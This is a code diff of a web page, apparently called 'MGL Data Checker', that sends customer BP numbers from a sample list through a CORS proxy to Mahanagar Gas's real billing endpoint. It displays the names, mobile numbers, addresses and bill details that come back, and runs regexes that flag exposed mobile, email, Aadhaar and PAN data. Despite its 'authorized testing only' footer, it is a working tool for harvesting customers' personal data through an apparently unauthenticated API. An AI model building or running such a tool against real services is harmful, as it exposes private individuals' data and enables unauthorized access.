@@ -3,656 +3,292 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>🔍 MGL Data Fetcher</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <title>🔍 MGL Data Checker</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', sans-serif;
+            font-family: Arial, sans-serif;
             background: #0a0e17;
             color: #eef2ff;
             min-height: 100vh;
             padding: 20px;
-        }
-        ::-webkit-scrollbar { width: 5px; height: 5px; }
-        ::-webkit-scrollbar-track { background: #0d1520; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: #1e2d4a; border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: #f59e0b; }
-
-        .container { max-width: 900px; margin: 0 auto; }
-
-        .header {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0 24px;
-            border-bottom: 1px solid #1a2744;
-            margin-bottom: 28px;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .brand { display: flex; align-items: center; gap: 14px; }
-        .brand-icon {
-            width: 44px; height: 44px;
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
             justify-content: center;
-            font-size: 20px;
-            box-shadow: 0 0 30px rgba(245,158,11,0.15);
-        }
-        .brand h1 { font-size: 20px; font-weight: 800; }
-        .brand h1 span { color: #f59e0b; }
-        .brand small { display: block; font-size: 11px; color: #64748b; }
-
-        .badge {
-            padding: 6px 18px;
-            background: #111827;
-            border-radius: 50px;
-            border: 1px solid #1e2d4a;
-            font-size: 12px;
-            color: #94a3b8;
-            display: flex;
             align-items: center;
-            gap: 8px;
         }
-        .badge .dot {
-            width: 8px; height: 8px;
-            border-radius: 50%;
-            background: #22c55e;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.8); }
-        }
-
-        .card {
+        .container {
+            max-width: 700px;
+            width: 100%;
             background: #0f172a;
             border-radius: 16px;
+            padding: 30px;
             border: 1px solid #1a2744;
-            overflow: hidden;
-            margin-bottom: 24px;
         }
-        .card-header {
-            padding: 18px 24px;
-            background: #0d1520;
-            border-bottom: 1px solid #1a2744;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .card-header h2 {
-            font-size: 16px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .card-body { padding: 24px; }
-
+        h1 { color: #f59e0b; font-size: 24px; }
         .input-group {
             display: flex;
             gap: 12px;
+            margin: 20px 0;
             flex-wrap: wrap;
         }
-        .input-group .field {
+        .input-group input {
             flex: 1;
-            min-width: 200px;
-            position: relative;
-        }
-        .input-group .field i {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #64748b;
-        }
-        .input-group .field input {
-            width: 100%;
-            padding: 14px 14px 14px 44px;
-            background: #060b18;
-            border: 2px solid #1a2744;
+            padding: 14px;
             border-radius: 10px;
+            border: 2px solid #1a2744;
+            background: #060b18;
             color: #eef2ff;
-            font-size: 15px;
-            font-family: 'Inter', sans-serif;
+            font-size: 16px;
             outline: none;
-            transition: all 0.3s;
+            min-width: 200px;
         }
-        .input-group .field input:focus {
+        .input-group input:focus {
             border-color: #f59e0b;
-            box-shadow: 0 0 0 4px rgba(245,158,11,0.12);
         }
-        .input-group .field input::placeholder {
-            color: #475569;
-        }
-
         .btn {
             padding: 14px 28px;
             border: none;
             border-radius: 10px;
             font-size: 14px;
             font-weight: 600;
-            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            white-space: nowrap;
-        }
-        .btn-primary {
             background: linear-gradient(135deg, #f59e0b, #d97706);
             color: #fff;
-            box-shadow: 0 4px 20px rgba(245,158,11,0.18);
         }
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(245,158,11,0.25);
-        }
-        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .btn-secondary {
-            background: #1a2744;
+        .btn:hover { transform: scale(1.02); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .result-box {
+            background: #0d1520;
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 16px;
+            border: 1px solid #1a2744;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
             color: #94a3b8;
-            border: 1px solid #1e2d4a;
+            display: none;
         }
-        .btn-secondary:hover { background: #1e2d4a; color: #eef2ff; }
+        .result-box.show { display: block; }
 
-        .flex-row { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 16px; }
+        .status {
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin: 12px 0;
+            display: none;
+        }
+        .status.show { display: block; }
+        .status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; }
+        .status.success { background: #0d1c0d; border: 1px solid #22c55e; color: #22c55e; }
+        .status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; }
+        .status.warning { background: #1c1a0d; border: 1px solid #eab308; color: #eab308; }
 
-        .quick-samples {
+        .quick-btns {
             display: flex;
             gap: 8px;
             flex-wrap: wrap;
-            margin-top: 12px;
+            margin: 10px 0;
         }
-        .quick-samples span {
-            color: #64748b;
-            font-size: 12px;
-            margin-right: 6px;
-        }
-        .quick-samples button {
+        .quick-btns button {
             padding: 4px 14px;
             background: #0d1520;
             border: 1px solid #1a2744;
             border-radius: 50px;
             color: #94a3b8;
             font-size: 12px;
-            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: all 0.2s;
         }
-        .quick-samples button:hover {
+        .quick-btns button:hover {
             border-color: #f59e0b;
             color: #eef2ff;
         }
 
-        #status {
-            padding: 12px 16px;
-            border-radius: 10px;
-            font-size: 14px;
-            margin: 16px 0;
-            display: none;
-        }
-        #status.info { background: #0d1a2b; border: 1px solid #3b82f6; color: #3b82f6; display: block; }
-        #status.success { background: #0d1c0d; border: 1px solid #22c55e; color: #22c55e; display: block; }
-        #status.error { background: #1c0d0d; border: 1px solid #ef4444; color: #ef4444; display: block; }
-        #status.warning { background: #1c1a0d; border: 1px solid #f59e0b; color: #f59e0b; display: block; }
-
-        #result {
-            display: none;
-            margin-top: 16px;
-        }
-
-        .result-card {
-            background: #0d1520;
-            border-radius: 12px;
-            border: 1px solid #1a2744;
-            overflow: hidden;
-        }
-
-        .result-header {
-            padding: 16px 20px;
-            background: #1c0d0d;
-            border-bottom: 1px solid #ef4444;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .result-header .title {
-            color: #ef4444;
-            font-weight: 700;
-            font-size: 18px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .result-header .badge-risk {
-            background: #ef4444;
-            color: #fff;
-            padding: 4px 16px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        .result-body { padding: 20px; }
-
-        .result-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-        }
-        @media (max-width: 600px) { .result-grid { grid-template-columns: 1fr; } }
-
-        .result-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 16px;
-            background: #060b18;
-            border-radius: 8px;
-            border: 1px solid #0d1520;
-            align-items: center;
-        }
-        .result-item .label {
-            color: #8b949e;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        .result-item .value {
-            color: #eef2ff;
-            font-weight: 600;
-            font-size: 14px;
-            text-align: right;
-            word-break: break-all;
-        }
-        .result-item .value.leak { color: #ef4444; }
-        .result-item .value.safe { color: #22c55e; }
-
-        .response-box {
-            background: #060b18;
-            border-radius: 8px;
-            padding: 16px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            color: #94a3b8;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #0d1520;
-            margin-top: 16px;
-        }
-
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid #1a2744;
-            border-top-color: #f59e0b;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .log-area {
-            background: #060b18;
-            border-radius: 10px;
-            border: 1px solid #1a2744;
-            padding: 16px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            color: #94a3b8;
-            white-space: pre-wrap;
-            word-break: break-all;
-            margin-top: 16px;
-            display: none;
-        }
-        .log-area .success { color: #22c55e; }
-        .log-area .error { color: #ef4444; }
-        .log-area .info { color: #3b82f6; }
-        .log-area .warning { color: #f59e0b; }
-
         .footer {
-            margin-top: 28px;
-            padding: 16px 0;
-            border-top: 1px solid #1a2744;
-            display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
+            margin-top: 20px;
             font-size: 12px;
             color: #475569;
+            text-align: center;
         }
         .footer .warn { color: #ef4444; }
 
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            padding: 12px 24px;
-            background: #0f172a;
-            border: 1px solid #22c55e;
+        .manual-instruction {
+            background: #0d1520;
             border-radius: 10px;
-            color: #22c55e;
-            font-weight: 500;
+            padding: 16px;
+            margin-top: 16px;
+            border: 1px solid #1a2744;
+            color: #94a3b8;
             font-size: 14px;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: all 0.4s;
-            pointer-events: none;
+            line-height: 1.6;
+            display: none;
         }
-        .toast.show { opacity: 1; transform: translateY(0); }
+        .manual-instruction.show { display: block; }
+        .manual-instruction strong { color: #f59e0b; }
+        .manual-instruction code {
+            background: #060b18;
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: #eef2ff;
+            font-size: 13px;
+        }
+        .manual-instruction .step {
+            padding: 8px 0;
+            border-bottom: 1px solid #1a2744;
+        }
+        .manual-instruction .step:last-child { border-bottom: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
+    <h1>🔍 MGL Data Checker</h1>
+    <p style="color:#64748b;font-size:14px;">Enter BP Number to check if data is exposed</p>
 
-    <!-- ─── HEADER ─── -->
-    <div class="header">
-        <div class="brand">
-            <div class="brand-icon"><i class="fas fa-fire"></i></div>
-            <div>
-                <h1>MGL<span>Fetcher</span></h1>
-                <small>Mahanagar Gas – Live Data Viewer</small>
-            </div>
+    <div class="input-group">
+        <input type="text" id="bpInput" placeholder="Enter BP Number" value="1100081583" />
+        <button class="btn" id="fetchBtn">🔍 Check</button>
+    </div>
+
+    <div class="quick-btns">
+        <button onclick="setBP('1100081583')">1100081583</button>
+        <button onclick="setBP('1100081082')">1100081082</button>
+        <button onclick="setBP('50246713')">50246713</button>
+    </div>
+
+    <div id="status" class="status"></div>
+
+    <div id="result" class="result-box"></div>
+
+    <div id="manualInstruction" class="manual-instruction">
+        <div style="color:#f59e0b;font-weight:600;margin-bottom:10px;">📋 Manual Check Steps</div>
+        <div class="step">
+            <strong>Step 1:</strong> Open this URL in a new tab (copy-paste):
+            <br /><code id="manualUrl">https://www.mahanagargas.com/ajax/get-billing-details</code>
         </div>
-        <div class="badge">
-            <span class="dot"></span>
-            <span>Live API</span>
+        <div class="step">
+            <strong>Step 2:</strong> Click <strong>"Fetch Data"</strong> button above to see the full response.
+        </div>
+        <div class="step">
+            <strong>Step 3:</strong> If you see <span style="color:#ef4444;">mobile, email, address</span> in the response – <strong style="color:#ef4444;">DATA LEAK CONFIRMED!</strong>
         </div>
     </div>
 
-    <!-- ─── MAIN CARD ─── -->
-    <div class="card">
-        <div class="card-header">
-            <h2><i class="fas fa-search" style="color:#f59e0b;"></i> Enter BP Number</h2>
-            <span style="color:#64748b;font-size:12px;">Fetch customer details from MGL API</span>
-        </div>
-        <div class="card-body">
-
-            <!-- ─── INPUT ─── -->
-            <div class="input-group">
-                <div class="field">
-                    <i class="fas fa-hashtag"></i>
-                    <input type="text" id="bpInput" placeholder="Enter BP Number (e.g. 1100081583)" value="1100081583" />
-                </div>
-                <button class="btn btn-primary" id="fetchBtn">
-                    <i class="fas fa-download"></i> Fetch Data
-                </button>
-                <button class="btn btn-secondary" onclick="clearAll()">
-                    <i class="fas fa-times"></i> Clear
-                </button>
-            </div>
-
-            <!-- ─── QUICK SAMPLES ─── -->
-            <div class="quick-samples">
-                <span>Quick:</span>
-                <button onclick="setBP('1100081583')">1100081583</button>
-                <button onclick="setBP('1100081082')">1100081082</button>
-                <button onclick="setBP('50246713')">50246713</button>
-            </div>
-
-            <!-- ─── STATUS ─── -->
-            <div id="status"></div>
-
-            <!-- ─── RESULT ─── -->
-            <div id="result"></div>
-
-            <!-- ─── LOG ─── -->
-            <div class="log-area" id="logArea"></div>
-
-        </div>
-    </div>
-
-    <!-- ─── FOOTER ─── -->
     <div class="footer">
-        <span><span class="warn">⚠️</span> Data fetched from <code>mahanagargas.com</code></span>
-        <span>For authorized testing only</span>
+        <span class="warn">⚠️</span> For authorized security testing only.
     </div>
-
 </div>
 
-<div class="toast" id="toast">✅ Copied!</div>
-
 <script>
-    // ─── DOM ───
     const bpInput = document.getElementById('bpInput');
     const fetchBtn = document.getElementById('fetchBtn');
     const statusDiv = document.getElementById('status');
-    const logArea = document.getElementById('logArea');
     const resultDiv = document.getElementById('result');
+    const manualDiv = document.getElementById('manualInstruction');
 
-    // ─── VERCEL PROXY URL ───
-    const proxy = 'https://mglcheckernee.vercel.app/api/proxy';
-
-    // ─── SET BP ───
     function setBP(val) {
         bpInput.value = val;
         fetchBtn.click();
     }
 
-    // ─── LOG ───
-    function log(msg, type = 'info') {
-        logArea.style.display = 'block';
-        const line = document.createElement('div');
-        line.className = type;
-        line.textContent = msg;
-        logArea.appendChild(line);
-        logArea.scrollTop = logArea.scrollHeight;
+    function showStatus(msg, type = 'info') {
+        statusDiv.className = `status show ${type}`;
+        statusDiv.textContent = msg;
     }
 
-    function setStatus(msg, type = 'info') {
-        statusDiv.className = type;
-        statusDiv.innerHTML = msg;
-        statusDiv.style.display = 'block';
+    function hideStatus() {
+        statusDiv.className = 'status';
+        statusDiv.textContent = '';
     }
 
-    function clearAll() {
-        logArea.innerHTML = '';
-        logArea.style.display = 'none';
-        resultDiv.innerHTML = '';
-        resultDiv.style.display = 'none';
-        statusDiv.style.display = 'none';
+    function showResult(data) {
+        resultDiv.textContent = data;
+        resultDiv.className = 'result-box show';
     }
 
-    function showToast(msg) {
-        const t = document.getElementById('toast');
-        t.textContent = msg || '✅ Copied!';
-        t.classList.add('show');
-        setTimeout(() => t.classList.remove('show'), 2000);
+    function hideResult() {
+        resultDiv.textContent = '';
+        resultDiv.className = 'result-box';
     }
 
-    // ─── ESCAPE ───
-    function escapeHtml(str) {
-        if (!str) return '';
-        const div = document.createElement('div');
-        div.textContent = str;
-        return div.innerHTML;
+    function showManual(url) {
+        document.getElementById('manualUrl').textContent = url;
+        manualDiv.className = 'manual-instruction show';
     }
 
-    // ─── DETECT LEAK ───
-    function detectLeak(text) {
-        const leaks = [];
-        const patterns = [
-            { type: '📱 Mobile', regex: /[6-9][0-9]{9}/g },
-            { type: '📧 Email', regex: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g },
-            { type: '📍 Address', regex: /(?:maharashtra|mumbai|pune|delhi|bangalore|chennai|kolkata|hyderabad|road|street|building|flat|society|colony|nagar|chowk)/gi },
-            { type: '👤 Name', regex: /(?:mr\.|ms\.|mrs\.|dr\.|shri|smt)\.?\s+[a-z]{2,}/gi },
-            { type: '🆔 Aadhar', regex: /[2-9][0-9]{11}/g },
-            { type: '📄 PAN', regex: /[A-Z]{5}[0-9]{4}[A-Z]{1}/g },
-            { type: '🏠 PIN', regex: /\b[1-9][0-9]{5}\b/g }
-        ];
-        for (const p of patterns) {
-            let match;
-            while ((match = p.regex.exec(text)) !== null) {
-                if (match[0]) {
-                    leaks.push({ type: p.type, value: match[0] });
-                }
-            }
-        }
-        const unique = [];
-        const seen = new Set();
-        for (const l of leaks) {
-            const key = l.type + l.value;
-            if (!seen.has(key)) { seen.add(key); unique.push(l); }
-        }
-        return unique;
-    }
-
-    // ─── BUILD RESULT ───
-    function buildResult(data, responseText, leaks, bp) {
-        const hasLeak = leaks.length > 0;
-        const d = data.response || data;
-
-        const fields = [
-            { label: '👤 Customer Name', key: 'full_name', value: d.full_name, leak: true },
-            { label: '📱 Mobile', key: 'mobile', value: d.mobile, leak: true },
-            { label: '📍 Location', key: 'location', value: d.location, leak: true },
-            { label: '🏠 House Number', key: 'house_number', value: d.house_number, leak: true },
-            { label: '🏙️ City', key: 'city', value: d.city, leak: true },
-            { label: '📮 Postal Code', key: 'postal_code', value: d.postal_code, leak: true },
-            { label: '📋 BP Number', key: 'bp_number', value: d.bp_number || bp, leak: false },
-            { label: '🆔 CA Number', key: 'ca_number', value: d.ca_number || d.bp_master_id, leak: false },
-            { label: '🧾 Bill Number', key: 'bill_number', value: d.bill_number, leak: false },
-            { label: '📅 Bill Date', key: 'document_date', value: d.document_date, leak: false },
-            { label: '📅 Due Date', key: 'due_date', value: d.due_date, leak: false },
-            { label: '💰 Total Bill', key: 'total_bil_amount', value: d.total_bil_amount, leak: false },
-            { label: '💵 Amount to Pay', key: 'amount_to_be_paid', value: d.amount_to_be_paid, leak: false },
-            { label: '📊 Consumption', key: 'consumption', value: d.consumption, leak: false },
-        ];
-
-        let itemsHTML = fields
-            .filter(f => f.value)
-            .map(f => `
-                <div class="result-item">
-                    <span class="label">${f.label}</span>
-                    <span class="value ${f.leak ? 'leak' : 'safe'}">${escapeHtml(f.value)}</span>
-                </div>
-            `).join('');
-
-        let leakHTML = '';
-        if (hasLeak) {
-            leakHTML = `
-                <div style="background:#1c0d0d;border:1px solid #ef4444;border-radius:8px;padding:12px 16px;margin-bottom:16px;">
-                    <strong style="color:#ef4444;">🔴 ${leaks.length} Data Leak${leaks.length > 1 ? 's' : ''} Detected!</strong>
-                    <div style="color:#8b949e;font-size:13px;margin-top:4px;">
-                        Personal data exposed: ${leaks.map(l => `${l.type}: ${escapeHtml(l.value)}`).join(' | ')}
-                    </div>
-                </div>
-            `;
-        }
-
-        return `
-            <div class="result-card">
-                <div class="result-header">
-                    <div class="title">
-                        <i class="fas fa-user-circle"></i>
-                        ${d.full_name || 'Customer Data'}
-                    </div>
-                    <span class="badge-risk">${hasLeak ? '⚠️ LEAK' : '🔒 SECURE'}</span>
-                </div>
-                <div class="result-body">
-                    ${leakHTML}
-                    <div class="result-grid">${itemsHTML}</div>
-                    <details style="margin-top:16px;">
-                        <summary style="cursor:pointer;color:#64748b;font-size:13px;">
-                            <i class="fas fa-code"></i> View Raw API Response
-                        </summary>
-                        <div class="response-box">${escapeHtml(responseText || 'No response')}</div>
-                    </details>
-                </div>
-            </div>
-        `;
-    }
-
-    // ─── MAIN FETCH ───
     document.getElementById('fetchBtn').addEventListener('click', async function() {
         const bp = bpInput.value.trim();
-
         if (!bp) {
-            setStatus('⚠️ Please enter a BP Number', 'warning');
+            showStatus('⚠️ Please enter a BP Number', 'warning');
             return;
         }
 
         this.disabled = true;
-        this.innerHTML = `<span class="spinner"></span> Fetching...`;
-        clearAll();
-
-        setStatus(`⏳ Fetching data for BP: ${bp}...`, 'info');
-        log(`🚀 Fetching data for BP: ${bp}`, 'info');
+        this.textContent = '⏳ Checking...';
+        hideStatus();
+        hideResult();
+        manualDiv.className = 'manual-instruction';
 
         try {
-            // ─── GET REQUEST (VERCEL PROXY) ───
-            const response = await fetch(`${proxy}?bpNumber=${bp}`, {
-                method: 'GET',
+            // ─── TRY POST REQUEST ───
+            const targetUrl = 'https://www.mahanagargas.com/ajax/get-billing-details';
+            const params = new URLSearchParams();
+            params.append('bpNumber', bp);
+            params.append('bp', bp);
+            params.append('bp_number', bp);
+
+            // Using a CORS proxy (free)
+            const proxy = 'https://corsproxy.io/?';
+            const response = await fetch(proxy + encodeURIComponent(targetUrl), {
+                method: 'POST',
                 headers: {
-                    'Accept': 'application/json, text/plain, */*',
+                    'Content-Type': 'application/x-www-form-urlencoded',
                 },
+                body: params.toString(),
             });
 
             const responseText = await response.text();
 
-            // ─── PARSE JSON ───
-            let json = null;
+            // ─── CHECK FOR LEAK ───
+            const hasMobile = /[6-9][0-9]{9}/.test(responseText);
+            const hasEmail = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(responseText);
+            const hasAddress = /(?:maharashtra|mumbai|pune|delhi|bangalore|chennai|kolkata|hyderabad|road|street|building|flat|society)/i.test(responseText);
+            const hasName = /(?:mr\.|ms\.|mrs\.|dr\.|shri|smt)\.?\s+[a-z]{2,}/i.test(responseText);
+
+            // ─── DISPLAY RESULT ───
+            let displayText = responseText;
+
+            // Try to format JSON if possible
             try {
-                json = JSON.parse(responseText);
+                const json = JSON.parse(responseText);
+                displayText = JSON.stringify(json, null, 2);
             } catch (e) {
-                // Try to extract JSON from response
-                const match = responseText.match(/\{.*\}/s);
-                if (match) {
-                    try {
-                        json = JSON.parse(match[0]);
-                    } catch (e2) {}
-                }
+                // Not JSON
             }
 
-            // ─── CHECK RESPONSE ───
-            if (!json || !json.response) {
-                setStatus(`❌ No data found for BP: ${bp}`, 'error');
-                log(`❌ No data found for BP: ${bp}`, 'error');
-                log(`📄 Raw response: ${responseText.substring(0, 200)}`, 'warning');
-                this.disabled = false;
-                this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
-                return;
+            showResult(displayText);
+
+            if (hasMobile || hasEmail || hasAddress || hasName) {
+                let leakDetails = [];
+                if (hasMobile) leakDetails.push('📱 Mobile Number');
+                if (hasEmail) leakDetails.push('📧 Email Address');
+                if (hasAddress) leakDetails.push('📍 Address');
+                if (hasName) leakDetails.push('👤 Name');
+                showStatus(`🔴 DATA LEAK FOUND! ${leakDetails.join(', ')}`, 'error');
+            } else {
+                showStatus('✅ No personal data found in API response', 'success');
             }
 
-            // ─── DETECT LEAKS ───
-            const leaks = detectLeak(responseText);
-            const hasLeak = leaks.length > 0;
-
-            // ─── BUILD RESULT ───
-            resultDiv.innerHTML = buildResult(json, responseText, leaks, bp);
-            resultDiv.style.display = 'block';
-
-            setStatus(
-                hasLeak ?
-                `🔴 ${leaks.length} Data Leak${leaks.length > 1 ? 's' : ''} Found!` :
-                '✅ No data leaks detected',
-                hasLeak ? 'error' : 'success'
-            );
-
-            log(`✅ Data fetched successfully for BP: ${bp}`, 'success');
-            if (hasLeak) {
-                log(`🔴 ${leaks.length} leaks detected`, 'error');
-            }
+            showManual(targetUrl);
 
         } catch (error) {
-            setStatus(`❌ Error: ${error.message}`, 'error');
-            log(`❌ ${error.message}`, 'error');
+            showStatus(`❌ Error: ${error.message}. Try the manual method below.`, 'error');
+            showManual('https://www.mahanagargas.com/ajax/get-billing-details');
         } finally {
             this.disabled = false;
-            this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
+            this.textContent = '🔍 Check';
         }
     });
 </script>
